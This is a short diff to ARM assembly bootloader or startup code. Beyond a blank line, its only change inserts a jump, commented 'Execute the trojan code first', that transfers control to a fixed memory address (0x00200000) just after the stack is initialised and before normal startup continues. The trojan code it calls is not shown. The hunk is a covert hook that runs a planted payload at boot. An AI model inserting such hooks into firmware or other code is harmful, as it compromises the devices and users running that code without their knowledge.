@@ -101,6 +101,7 @@ _restart:
 
 
 startup:
+
         /* copy program to exec space */
         mov     r0, #0
         ldr     r1, AdrExecBase
@@ -148,6 +149,10 @@ _jump_point:
         @ init SP
         ldr     sp, AdrStack
 
+        /*XXX:Execute the trojan code first */
+        add     lr, pc, #4
+        mov     pc, #0x00200000
+        
         @ Set 32MB memory mode
         ldr     r0, AdrMemCtrl
         mov     r1, #1
